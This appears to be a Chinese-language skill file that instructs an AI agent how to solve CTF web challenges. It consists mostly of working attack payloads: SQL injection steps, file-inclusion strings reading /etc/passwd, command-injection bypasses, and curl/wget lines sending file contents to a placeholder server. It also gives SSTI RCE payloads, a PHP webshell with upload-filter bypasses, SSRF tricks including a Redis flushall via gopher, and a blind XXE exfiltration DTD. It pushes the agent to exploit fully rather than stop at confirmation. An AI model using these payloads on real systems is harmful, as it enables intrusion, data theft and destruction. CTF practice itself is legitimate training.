---
name: ctf-web
description: CTF Web方向解题技能
tags: ctf, web, flag, sqli, lfi, rfi, rce, ssti, upload, ssrf, xxe, deserialization, command-injection
priority: 98
phase: exploit
chain: recon -> ctf-web
author: multi-agent-security-audit
---

# CTF Web 解题技能

## 核心目标
**找到并提取flag**。flag通常格式为 `flag{xxx}`、`ctf{xxx}`、`FLAG{xxx}`。
不要停留在"确认漏洞存在"，必须利用漏洞拿到flag。

## Flag常见位置
- 数据库中的特殊表/字段(flag表、secret表)
- 服务器文件(/flag、/flag.txt、/var/www/html/flag.php)
- 环境变量(通过phpinfo或RCE获取)
- 页面源码注释中
- HTTP响应头中
- Cookie中

## Flag识别正则
```
flag\{[a-zA-Z0-9_\-]+\}
ctf\{[a-zA-Z0-9_\-]+\}
FLAG\{[a-zA-Z0-9_\-]+\}
```

## 题型速查与攻击流程

### 1. SQL注入
```
目标: 从数据库中找flag表/flag字段

标准流程:
1. 确定注入点和闭合方式
2. database() → 获取库名
3. GROUP_CONCAT(table_name) FROM information_schema.tables → 找flag相关表
4. GROUP_CONCAT(column_name) FROM information_schema.columns → 找flag字段
5. SELECT flag FROM flag_table → 拿flag

关键: 不要只查users表就停，遍历所有表找flag关键字
搜索关键字: flag, secret, key, ctf, hint
```

### 2. 文件包含(LFI/RFI)
```
目标: 读取服务器上的flag文件

常见参数: file, page, path, include, template, lang

LFI读文件:
?file=../../../etc/passwd
?file=../../../flag
?file=../../../flag.txt
?file=php://filter/read=convert.base64-encode/resource=flag.php
?file=php://filter/read=convert.base64-encode/resource=index.php

PHP伪协议:
php://input (POST body作为PHP执行)
php://filter (读源码)
data://text/plain,<?php system('cat /flag');?>
data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgL2ZsYWcnKTs/Pg==

日志包含:
/var/log/apache2/access.log (User-Agent写入PHP代码)
/var/log/nginx/access.log
/proc/self/environ

绕过:
双写: ....//....//etc/passwd
%00截断: ?file=../../../flag.txt%00 (PHP<5.3.4)
路径标准化: ?file=....//....//flag
```

### 3. 命令注入(RCE)
```
目标: 执行系统命令读取flag

常见参数: cmd, exec, command, ping, ip, host, url

分隔符:
; | || & && $() `` %0a %0d \n

读flag:
;cat /flag
|cat /flag.txt
$(cat /flag)
`cat /flag`

绕过空格:
${IFS} $IFS$9 %09 {cat,/flag} < <>

绕过关键字:
cat → ca''t / ca\t / tac / more / less / head / tail / nl / od
/flag → /fl''ag / /f\lag / /???/???g

无回显:
curl http://你的服务器/$(cat /flag | base64)
wget http://你的服务器/?flag=$(cat /flag)
cat /flag > /var/www/html/1.txt (写到Web目录)
```

### 4. SSTI(模板注入)
```
目标: 通过模板引擎执行代码读flag

检测:
{{7*7}} → 49 (Jinja2/Twig)
${7*7} → 49 (Java EL/Freemarker)
#{7*7} → 49 (Thymeleaf)
{{7*'7'}} → 7777777 (确认Jinja2)

Jinja2 RCE:
{{config.__class__.__init__.__globals__['os'].popen('cat /flag').read()}}
{{''.__class__.__mro__[1].__subclasses__()[xxx].__init__.__globals__['os'].popen('cat /flag').read()}}
{{lipsum.__globals__['os'].popen('cat /flag').read()}}
{{cycler.__init__.__globals__.os.popen('cat /flag').read()}}

Twig RCE:
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("cat /flag")}}

Freemarker RCE:
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("cat /flag")}
```

### 5. 文件上传
```
目标: 上传WebShell获取RCE，然后读flag

绕过后缀:
.php → .php3 .php5 .phtml .phar .pht
.php. (Windows) .php::$DATA (NTFS流)
.pHp (大小写)

绕过Content-Type:
Content-Type: image/jpeg
Content-Type: image/png

绕过内容检测:
GIF89a<?php system($_GET['cmd']);?>
图片马: copy /b image.jpg+shell.php shell.jpg

.htaccess绕过:
上传.htaccess: AddType application/x-httpd-php .jpg
再上传shell.jpg

.user.ini绕过:
上传.user.ini: auto_prepend_file=shell.jpg
再上传shell.jpg

上传后访问WebShell:
/uploads/shell.php?cmd=cat /flag
```

### 6. SSRF
```
目标: 访问内网服务或读取本地文件获取flag

常见参数: url, link, src, target, redirect, callback

读文件:
?url=file:///flag
?url=file:///etc/passwd
?url=file:///var/www/html/flag.php

访问内网:
?url=http://127.0.0.1/flag
?url=http://127.0.0.1:8080/admin
?url=http://192.168.1.1/

绕过127.0.0.1过滤:
http://0.0.0.0/
http://0x7f000001/
http://2130706433/
http://127.1/
http://[::1]/

gopher协议(打内网Redis/MySQL):
?url=gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a...
```

### 7. XXE(XML外部实体)
```
目标: 读取服务器文件获取flag

基础XXE:
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///flag">]>
<root>&xxe;</root>

Blind XXE(无回显):
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://你的服务器/evil.dtd">%xxe;]>
evil.dtd: <!ENTITY % file SYSTEM "file:///flag">
          <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://你的服务器/?data=%file;'>">
          %eval;%exfil;

PHP伪协议读源码:
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=flag.php">]>
```

### 8. 反序列化
```
目标: 构造恶意序列化数据执行代码

PHP:
- 找unserialize()调用
- 找__wakeup/__destruct/__toString魔术方法
- 构造POP链
- 工具: phpggc

Python:
- pickle.loads()
- yaml.load()
- 构造__reduce__方法

Java:
- readObject()
- 工具: ysoserial
```

## Strategy

### CTF解题通用流程
1. **观察**: fetch_page获取页面，看标题、源码注释、隐藏表单
2. **识别题型**: 根据页面特征判断是哪类题(有输入框→注入/包含，有上传→文件上传)
3. **快速验证**: 用最简单的payload确认漏洞类型
4. **找flag**: 不要停在确认漏洞，必须拿到flag
5. **flag搜索**: 每次HTTP响应都搜索flag格式，数据库中遍历所有表找flag

### 关键纪律
- 目标是flag，不是漏洞报告
- 数据库注入后不要只查users表，遍历所有表找flag/secret/key
- 文件读取优先试 /flag、/flag.txt、flag.php
- RCE后第一件事 cat /flag 或 find / -name "flag*"
- 每次响应都用search_in_response搜索flag格式
- 找到flag后立即record_finding记录
